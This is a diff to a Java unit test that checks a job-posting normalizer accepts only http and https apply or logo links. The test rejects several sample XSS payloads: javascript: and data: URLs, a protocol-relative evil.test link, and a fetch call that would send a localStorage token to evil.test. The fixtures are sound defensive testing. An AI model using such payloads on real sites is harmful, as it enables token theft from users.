@@ -37,6 +37,20 @@ class JobNormalizerTest {
     }
 
     @Test
+    void onlyHttpUrlsSurviveAsApplyOrLogoLinks() {
+        assertEquals("https://jobs.example.test/1", JobNormalizer.httpUrl(" https://jobs.example.test/1 "));
+        assertEquals("http://example.test", JobNormalizer.httpUrl("http://example.test"));
+        assertNull(JobNormalizer.httpUrl("javascript:alert(document.domain)"));
+        assertNull(JobNormalizer.httpUrl("JaVaScRiPt:alert(1)"));
+        assertNull(JobNormalizer.httpUrl("data:text/html,<script>alert(1)</script>"));
+        assertNull(JobNormalizer.httpUrl("//evil.test/x"));
+        assertNull(JobNormalizer.httpUrl("not a url"));
+        JobPosting job = normalizer.normalize(JobProvider.JobPostingCandidate.from(new ProviderJob("1", "Acme", "Engineer", "Remote",
+                null, null, "javascript:fetch('//evil.test?t='+localStorage.token)", null, "x", null, null, null, null, "{}"), "telegram"));
+        assertNull(job.getApplyUrl());
+    }
+
+    @Test
     void unescapesGreenhouseStyleHtmlAndKeepsParagraphsAndBullets() {
         String escaped = "&lt;h2&gt;About us&lt;/h2&gt;&lt;p&gt;We build &amp;amp; ship.&lt;/p&gt;"
                 + "&lt;ul&gt;&lt;li&gt;Java&lt;/li&gt;&lt;li&gt;SQL&lt;/li&gt;&lt;/ul&gt;";
